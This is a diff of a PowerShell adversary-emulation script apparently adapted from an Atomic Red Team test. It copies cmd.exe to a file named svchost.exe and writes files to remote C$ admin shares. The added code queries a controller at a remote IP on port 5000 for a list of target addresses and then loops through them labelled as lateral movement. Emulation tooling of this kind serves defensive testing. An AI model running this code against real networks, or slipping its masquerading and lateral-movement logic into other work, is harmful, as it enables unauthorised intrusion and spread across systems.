@@ -18,6 +18,12 @@ Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin
 
 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-12---svchost-writing-a-file-to-a-unc-path
 #>
+
+param
+(
+[parameter(Mandatory=$true)][String]$Target    
+)
+
 $good = $false
 $results = $null
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
@@ -27,15 +33,15 @@ if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
         
     copy  $Env:SystemDrive\Windows\System32\cmd.exe $Env:SystemDrive\svchost.exe
     sleep 1    
-    $variable = "$Env:SystemDrive\T1105.txt" | Out-String
-    $argumento = '/c' , 'echo copy cmd on C:\ > '+$variable
+    $variable = "\\"+$Target+"\c$\T1105.txt"
+    $argumento = '/c' , 'echo write on target '+$variable+': C:\ > '+$variable
     Start-Process $Env:SystemDrive\svchost.exe  $argumento     
     sleep 1 
-    $results = Get-Content  $Env:SystemDrive\T1105.txt  
+    $results = Get-Content  $variable
     if (!($results -eq $null) )
         {
         $good = $true 
-        Remove-Item -Path  $Env:SystemDrive\T1105.txt
+        Remove-Item -Path  $variable
         Remove-Item -Path  $Env:SystemDrive\svchost.exe
                   
         }
@@ -65,11 +71,31 @@ else
 $execute = {
 
 }
-
 #GiveMeData if needed
+$final_results = ""
+$final_good = $false
+$uri = "http://"+$global:remoteip+":5000/getdata"
 
-#get-credentials
-$execute = invoke-copy_svchost
+#give me IP
+$resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id;ip=""} $uri
+$ipaddresses = $resp.Content | ConvertFrom-Json
+
+
+
+#lateral movement
+foreach($elem in $ipaddresses.datastore)
+    {
+    $execute = invoke-copy_svchost -target $elem.ip
+    $final_results += $execute.results
+    if($execute.success)
+        {
+        $final_good = $true
+        break
+        }
+
+    }
+
+
 
 #PutData if needed
   # if($execute.success)
@@ -77,4 +103,4 @@ $execute = invoke-copy_svchost
 
   # }
 
-return @{results=$execute.results;success=$execute.success}
+return @{results=$final_results;success=$final_good}
